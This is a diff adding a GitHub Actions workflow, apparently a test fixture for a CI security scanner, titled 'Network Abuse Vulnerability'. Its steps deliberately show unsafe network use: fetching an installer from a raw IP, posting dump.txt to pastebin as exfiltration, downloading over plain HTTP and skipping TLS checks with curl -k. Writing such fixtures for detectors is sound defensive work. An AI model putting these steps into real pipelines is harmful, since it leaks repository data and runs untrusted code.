@@ -1,0 +1,28 @@
+name: Network Abuse Vulnerability
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  network-checks:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+        with:
+          persist-credentials: false
+
+      - name: Fetch from raw IP address
+        run: curl https://198.51.100.5/installer.sh
+
+      - name: Exfiltrate data to pastebin
+        run: curl -d @dump.txt https://pastebin.com/api/post
+
+      - name: Download over plain HTTP
+        run: curl http://insecure.example.invalid/package.tar.gz
+
+      - name: Bypass TLS certificate validation
+        run: curl -k https://example.invalid/api
